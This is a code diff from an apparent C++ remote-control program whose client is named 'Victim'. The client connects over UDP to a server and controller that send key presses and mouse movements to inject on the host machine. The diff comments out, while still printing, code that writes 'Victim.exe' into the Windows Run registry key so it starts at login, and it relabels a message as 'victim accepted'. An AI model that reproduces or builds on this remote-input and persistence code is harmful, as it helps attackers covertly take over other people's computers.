@@ -8,14 +8,14 @@
 #define SERVER_PORT 2390
 
 /* possible messages form server:
-* a: accepted
-* e: exit
-* c: connected with controller
-* d: diconnected from controller
-* p: key pressed
-* r: key released
-* s: mouse scroll
-* m: mouse move
+v: victim accepted
+e: exit
+c: connected with controller
+d: diconnected from controller
+p: key pressed
+r: key released
+s: mouse scroll
+m: mouse move
 */
 
 int main()
@@ -28,10 +28,10 @@ int main()
         }
     };
 
-    std::wstring progPath = L"C:\\Users\\feder\\Desktop\\Controller\\x64\\Release\\Victim.exe";
+    /*std::wstring progPath = L"C:\\Users\\feder\\Desktop\\Controller\\x64\\Release\\Victim.exe";
     HKEY hkey = NULL;
     LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);   
-    LONG status = RegSetValueEx(hkey, L"Victim", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
+    LONG status = RegSetValueEx(hkey, L"Victim", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));*/
 
     bool isPaired = false; //with controller
     sf::UdpSocket ard;
@@ -39,7 +39,7 @@ int main()
     ard.send(init.c_str(), init.size()+1, SERVER_IP, SERVER_PORT);
     std::thread thr(keepConnected, std::ref(ard));
 
-    connect:
+connect:
     size_t size;
     sf::IpAddress ip;
     unsigned short port;
@@ -47,7 +47,7 @@ int main()
     char buf[1];
     ard.receive(buf, sizeof(buf), size, ip, port);
 
-    if (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'a')
+    if (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'v')
         goto connect;
 
     while (true)
